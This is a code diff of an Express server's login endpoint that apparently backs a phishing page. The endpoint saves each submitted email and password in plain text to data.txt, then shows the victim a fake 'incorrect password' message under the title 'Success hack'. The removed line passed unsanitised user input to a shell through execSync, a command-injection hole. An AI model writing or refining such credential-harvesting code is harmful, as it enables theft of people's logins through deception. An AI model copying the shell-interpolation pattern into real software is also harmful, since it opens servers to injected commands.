@@ -23,12 +23,10 @@ app.post('/login-info', (req, res) => {
             message: "Enter email and password"
         })
 
-        const data = {
-            email,
-            password
-        }
+        const data = `\n-email: ${email}\n-password: ${password}\n_____________________________`
+        
+        fs.appendFileSync('data.txt', data)
 
-        execSync(`echo ${JSON.stringify(data)} >> data.txt`)
         res.json({
             title: "Success hack",
             message: "Sorry, incorrect password or email address."
